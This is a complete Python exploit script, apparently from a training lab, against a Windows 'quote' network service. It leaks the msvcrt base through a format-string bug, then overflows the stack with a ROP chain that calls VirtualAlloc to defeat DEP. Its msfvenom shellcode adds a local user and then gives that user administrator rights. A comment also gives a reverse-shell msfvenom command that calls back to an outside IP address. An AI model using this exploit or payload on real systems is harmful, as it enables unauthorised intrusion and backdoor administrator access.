#!/usr/bin/python3

from struct import pack, unpack

import pwn
import socket
import sys

# tested on Windows Server 2019 Standard (10.0.17763)

SERVER, PORT = sys.argv[1], 3700


def main():
    msvcrt = leakMsvcrt()
    exploit(msvcrt)

def leakMsvcrt():   # C:\Windows\SysWOW64\msvcrt.dll
    offLeakBase = -0x67d30
    updateQuote(1, b"AAAA" + (b":%08x" * 0x20) + b":BBBB")
    leak = int(getQuote(1).split(b":")[1], 16)
    base = leak + offLeakBase
    print(f"[+] Leaked base adress of MSVCRT: 0x{base:x}")
    return base

def exploit(msvcrt):
    size            = 0x5000
    offBufEip       = 0x80c

    badchars = b""
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    buf += nopsled()                                            # note: stack is now executable
    buf += shellcode()

    buf += b"A" * (offBufEip - len(virtualAllocStub()) - len(buf))
    buf += virtualAllocStub()                                   # setup call to VirtualAlloc
    buf += ropChainVirtualAlloc(msvcrt)                         # DEP bypass ROP chain

    buf += b"Z" * (size - len(buf))

    assert len(buf) == size
    for b in badchars: assert b not in buf

    print(logBadRequest(buf))


def nopsled(length=0x10):
    return b"\x90" * length

def nopsledRop(msvcrt, length=0x10):
    return pack("<I", msvcrt + 0xff0d) * length                 # ret

def virtualAllocStub():
    buf  = b""
    buf += b"AAAA"              # Address of VirtualAlloc
    buf += b"BBBB"              # Return address                = address of shellcode on the stack
    buf += b"CCCC"              # LPVOID lpAddress              = address of shellcode on the stack
    buf += pack("<I", 0x5000)   # SIZE_T dwSize
    buf += pack("<I", 0x1000)   # DWORD  flAllocationType       = 0x1000 = MEM_COMMIT
    buf += pack("<I", 0x40)     # DWORD  flProtect              = 0x40 = PAGE_EXECUTE_READWRITE
    return buf

def ropChainVirtualAlloc(msvcrt):
    buf  = b""

    ################################################################################
    # align pointer register to begin of stub for calling VirtualAlloc on the stack
    buf += ropMovEcxEsp(msvcrt)
    buf += ropMovEaxEcx(msvcrt)
    buf += pack("<I", msvcrt + 0xa9359)                         # pop ebp
    offEaxStub = -0x24
    buf += pack("<i", offEaxStub)
    buf += pack("<I", msvcrt + 0x3716d)                         # add eax, ebp
    buf += ropMovEcxEax(msvcrt)

    ################################################################################
    # compute address of VirtualAlloc

    # inspect Import Address Table (IAT) with WinDBG:
    # 0:000> !dh -a msvcrt => search for KERNEL => dump IAT and take first entry:
    #   _IMAGE_IMPORT_DESCRIPTOR 75059470
    #     KERNELBASE.dll
    #               75059000 Import Address Table
    #               75059498 Import Name Table
    #                      0 time date stamp
    #                      0 Index of first forwarder reference
    #
    #        75AC4640   C2 FileTimeToSystemTime
    # 0:003> dds 75059000 L1
    # 75059000  75ac4640 KERNELBASE!FileTimeToSystemTime
    offMsvcrtKernelfuncIAT = 0xb9000                            # ? 75059000 - msvcrt

    # 0:003> .shell -ci "!dh -a kernelbase" findstr /i FileTimeToSystemTime
    #        360  352 75AC4640 FileTimeToSystemTime
    # 0:003> .shell -ci "!dh -a kernelbase" findstr /i VirtualAlloc
    #       1777 1773 75ACA6D0 VirtualAlloc
    offKernelfuncVirtualalloc = 0x75ACA6D0 - 0x75AC4640

    buf += pack("<I", msvcrt + 0xa9359)                         # pop ebp
    buf += pack("<I", msvcrt + offMsvcrtKernelfuncIAT + 0x1c)
    buf += pack("<I", msvcrt + 0x66f5d)                         # mov eax,  [ebp-0x1C]

    buf += pack("<I", msvcrt + 0xa9359)                         # pop ebp
    buf += pack("<I", offKernelfuncVirtualalloc)
    buf += pack("<I", msvcrt + 0x3716d)                         # add eax, ebp

    ################################################################################
    # patch address of VirtualAlloc
    buf += ropPatch(msvcrt)

    ################################################################################
    # compute address of shellcode
    buf += ropMovEaxEcx(msvcrt)
    buf += pack("<I", msvcrt + 0xa9359)                         # pop ebp
    offEaxShellcode = -0x7f4
    buf += pack("<i", offEaxShellcode)
    buf += pack("<I", msvcrt + 0x3716d)                         # add eax, ebp

    ################################################################################
    # patch return address (address of shellcode)
    buf += pack("<I", msvcrt + 0x10778) * 4                     # inc ecx
    buf += ropPatch(msvcrt)

    ################################################################################
    # patch lpAddress (address of shellcode)
    buf += pack("<I", msvcrt + 0x10778) * 4                     # inc ecx
    buf += ropPatch(msvcrt)

    ################################################################################
    # align eax to VirtualAlloc stack frame
    buf += ropMovEaxEcx(msvcrt)
    buf += pack("<I", msvcrt + 0xa9359)                         # pop ebp
    offEaxStub = -0x8
    buf += pack("<i", offEaxStub)
    buf += pack("<I", msvcrt + 0x3716d)                         # add eax, ebp

    # buf += pack("<I", msvcrt + 0xcd62)                        # int3 debug gadget
    # buf += pack("<I", msvcrt + 0xec45)                        # ret (unique for debug breakpoint)

    ################################################################################
    # stack pivot
    buf += pack("<I", msvcrt + 0xfad5)                          # xchg eax, esp

    return buf

def ropMovEcxEsp(msvcrt):
    """GetSP routine"""
    buf  = b""
    buf += pack("<I", msvcrt + 0xd65d)                          # pop ecx
    buf += pack("<I", 0xffffffff)
    buf += pack("<I", msvcrt + 0xcd61)                          # and ecx, esp
    return buf

def ropMovEaxEcx(msvcrt):
    return pack("<I", msvcrt + 0xa5491)                         # mov eax, ecx

def ropMovEcxEax(msvcrt):
    buf  = b""
    buf += pack("<I", msvcrt + 0x9b2d6)                         # pop esi
    buf += pack("<I", msvcrt + 0xa936a)                         # pop ecx ; pop ecx
    buf += pack("<I", msvcrt + 0x5d1d1)                         # push eax ; call esi
    return buf

def ropPatch(msvcrt):
    """mov [ecx], eax with some scaffolding to preserve values of eax and ecx"""
    buf  = b""
    buf += pack("<I", msvcrt + 0x80530)                         # mov  [ecx], eax ; pop esi ; pop ebp
    buf += b"jjjj" * 2                                          # junk
    return buf

def shellcode():
    # buf += b"\xcc\x90\x90\x90"

    # I'm not sure why, but neither msfvenom reverse shell nor my own reverse shellcode work...
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=443 -f python

    # the following however works...

    # msfvenom -f python -p windows/exec CMD='net user /add tmp tmp /y'
    buf  = b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    buf += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
    buf += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    buf += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    buf += b"\x00\x53\xff\xd5\x6e\x65\x74\x20\x75\x73\x65\x72"
    buf += b"\x20\x2f\x61\x64\x64\x20\x74\x6d\x70\x20\x74\x6d"
    buf += b"\x70\x20\x2f\x79\x00"

    # msfvenom -f python -p windows/exec CMD='net localgroup administrators tmp /add'
    buf  = b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    buf += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
    buf += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    buf += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    buf += b"\x00\x53\xff\xd5\x6e\x65\x74\x20\x6c\x6f\x63\x61"
    buf += b"\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e"
    buf += b"\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x74\x6d"
    buf += b"\x70\x20\x2f\x61\x64\x64\x00"

    return buf


def getQuote(quotenr):
    return sendPayload(opcode=901, payload=pack("<I", quotenr))

def addQuote(quote):
    r = sendPayload(opcode=902, payload=quote)
    return unpack("<I", r)[0]

def updateQuote(quotenr, newquote):
    return sendPayload(opcode=903, payload=(
        pack("<I", quotenr)
        + newquote
    ))

def deleteQuote(quotenr):
    return sendPayload(opcode=904, payload=pack("<I", quotenr))

def logBadRequest(msg):
    return sendPayload(opcode=0, payload=msg)


def sendPayload(opcode, payload):
    buf = pack("<I", opcode) + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER, PORT))
    s.send(buf)
    res = s.recv(0x10000)
    s.close()
    return res


if __name__ == "__main__":
    main()
